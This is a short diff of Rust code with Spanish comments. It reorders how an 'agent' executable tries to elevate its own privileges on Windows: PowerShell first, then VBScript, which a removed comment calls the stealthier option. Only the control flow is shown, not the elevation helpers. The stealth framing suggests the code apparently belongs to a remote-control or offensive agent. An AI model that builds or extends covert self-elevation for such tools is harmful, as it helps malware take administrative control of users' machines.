@@ -477,15 +477,23 @@ fn elevate_agent() -> String {
     };
     
     // Elevar el ejecutable desde su ubicación actual (SIN copiar)
-    // TÉCNICA 1: Intentar VBScript (más sigiloso)
+    // TÉCNICA 1: Intentar PowerShell primero
+    let ps_result = elevate_agent_via_powershell(exe_str);
+    
+    // Si PowerShell funcionó (SUCCESS), retornar
+    if ps_result.contains("__SUCCESS__") {
+        return ps_result;
+    }
+    
+    debug_print!("DEBUG: PowerShell elevation failed, trying VBScript...");
+    
+    // TÉCNICA 2: VBScript como fallback
     if let Ok(result) = elevate_agent_via_vbs(exe_str) {
         return result;
     }
     
-    debug_print!("DEBUG: VBScript elevation failed, trying PowerShell...");
-    
-    // TÉCNICA 2: PowerShell como fallback
-    elevate_agent_via_powershell(exe_str)
+    // Si ambas técnicas fallaron, retornar el error de PowerShell
+    ps_result
 }
 
 /*
